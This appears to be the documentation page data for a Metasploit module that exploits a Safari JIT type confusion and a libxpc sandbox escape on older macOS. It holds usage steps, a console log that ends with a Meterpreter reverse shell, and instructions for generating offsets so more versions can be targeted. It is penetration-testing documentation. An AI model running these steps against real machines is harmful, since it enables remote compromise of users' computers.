{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/osx/browser/safari_proxy_object_type_confusion","result":{"data":{"moduleMetadataJson":{"id":"a4a3350a-6502-56c5-9dbd-7ff697d7222e","name":"Safari Proxy Object Type Confusion","fullname":"exploit/osx/browser/safari_proxy_object_type_confusion","description":"This module exploits a type confusion bug in the Javascript Proxy object in\n        WebKit. The DFG JIT does not take into account that, through the use of a Proxy,\n        it is possible to run arbitrary JS code during the execution of a CreateThis\n        operation. This makes it possible to change the structure of e.g. an argument\n        without causing a bailout, leading to a type confusion (CVE-2018-4233).\n\n          The JIT region is then replaced with shellcode which loads the second stage.\n        The second stage exploits a logic error in libxpc, which uses command execution\n        via the launchd's \"spawn_via_launchd\" API (CVE-2018-4404).","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/osx/browser/safari_proxy_object_type_confusion","documentationSlug":"/modules/documentation/exploit/osx/browser/safari_proxy_object_type_confusion"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits a type confusion bug in the Javascript Proxy object in\nWebKit. Safari on OSX 10.13.3 and lower are affected. The JS Proxy object\nwas introduced in Safari 10, so OSX 10.11 is not affected by the type\nconfusion, however the sandbox escape may still work.</p>\n<p>The DFG JIT does not take into account that, through the use of a Proxy,\nit is possible to run arbitrary JS code during the execution of a CreateThis\noperation. This makes it possible to change the structure of e.g. an argument\nwithout causing a bailout, leading to a type confusion (CVE-2018-4233).</p>\n<p>The JIT region is then replaced with shellcode which loads the second stage.\nThe second stage exploits a logic error in libxpc, which uses command execution\nvia the launchd's \"spawn<em>via</em>launchd\" API (CVE-2018-4404).</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use exploit/osx/browser/safari_proxy_object_type_confusion</code></li>\n<li><code class=\"language-text\">set LHOST &lt;tab&gt;</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n<li>Visit the URL on a vulnerable version of Safari</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"high-sierra-1013\" style=\"position:relative;\"><a href=\"#high-sierra-1013\" aria-label=\"high sierra 1013 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Sierra 10.13</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/osx/browser/safari_proxy_object_type_confusion\nmsf5 exploit(osx/browser/safari_proxy_object_type_confusion) &gt; set LHOST 192.168.0.2\nLHOST =&gt; 192.168.0.2\nmsf5 exploit(osx/browser/safari_proxy_object_type_confusion) &gt; exploit\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf5 exploit(osx/browser/safari_proxy_object_type_confusion) &gt;\n[*] Started reverse TCP handler on 192.168.0.2:4444\n[*] Using URL: http://0.0.0.0:8080/0PiuTy\n[*] Local IP: http://192.168.0.2:8080/0PiuTy\n[*] Server started.\n\nmsf5 exploit(osx/browser/safari_proxy_object_type_confusion) &gt;\n[*] 192.168.0.2   safari_proxy_object_type_confusion - Request from Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\n[*] Sending stage (53508 bytes) to 192.168.0.2\n[*] Meterpreter session 1 opened (192.168.0.2:4444 -&gt; 192.168.0.2:33200) at 2018-11-20 16:28:59 +0800\n\nmsf5 exploit(osx/browser/safari_proxy_object_type_confusion) &gt; sessions 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; sysinfo\nComputer     : Users-iMac.local\nOS           : Darwin 17.0.0 Darwin Kernel Version 17.0.0: Thu Aug 24 21:48:19 PDT 2017; root:xnu-4570.1.46~2/RELEASE_X86_64\nArchitecture : x64\nMeterpreter  : python/osx</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"adding-offsets-for-new-versions\" style=\"position:relative;\"><a href=\"#adding-offsets-for-new-versions\" aria-label=\"adding offsets for new versions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Adding offsets for new versions</h3>\n<p>Although all macOS versions from 10.12 -> 10.13.3 are vulnerable, some versions\nare not supported. It's easy to add support for a vulnerable version by running\nthe script <code class=\"language-text\">external/source/exploits/CVE-2018-4404/gen_offsets.rb</code> on the\ntarget version.</p>\n<p>You will need to install the latest radare2 for the script to function.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ git clone https://github.com/radare/radare2 &amp;&amp; cd radare2 &amp;&amp; ./sys/install.sh &amp;&amp; cd ..`\n$ ruby external/source/exploits/CVE-2018-4404/gen_offsets.rb\n      &#39;10.13&#39; =&gt; {\n        :dyld_stub_loader =&gt; &#39;0x000012a8&#39;,\n        :dlopen =&gt; &#39;0x00002e60&#39;,\n        :confstr =&gt; &#39;0x000024fc&#39;,\n        :strlen =&gt; &#39;0x00001440&#39;,\n        :strlen_got =&gt; &#39;0xee8&#39;,\n      },</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The offset <code class=\"language-text\">:jsc_vtab</code> cannot be generated but you can guess it is either 0xe000 or 0xd000.\nYou can then add the offsets to the module:\n<code class=\"language-text\">modules/exploits/osx/browser/safari_proxy_object_type_confusion.rb</code></p>\n<p>Please don't forget to contribute the offsets back to the framework if you have\nsuccessfully tested them.</p>"}}},"pageContext":{"id":"a4a3350a-6502-56c5-9dbd-7ff697d7222e"}}}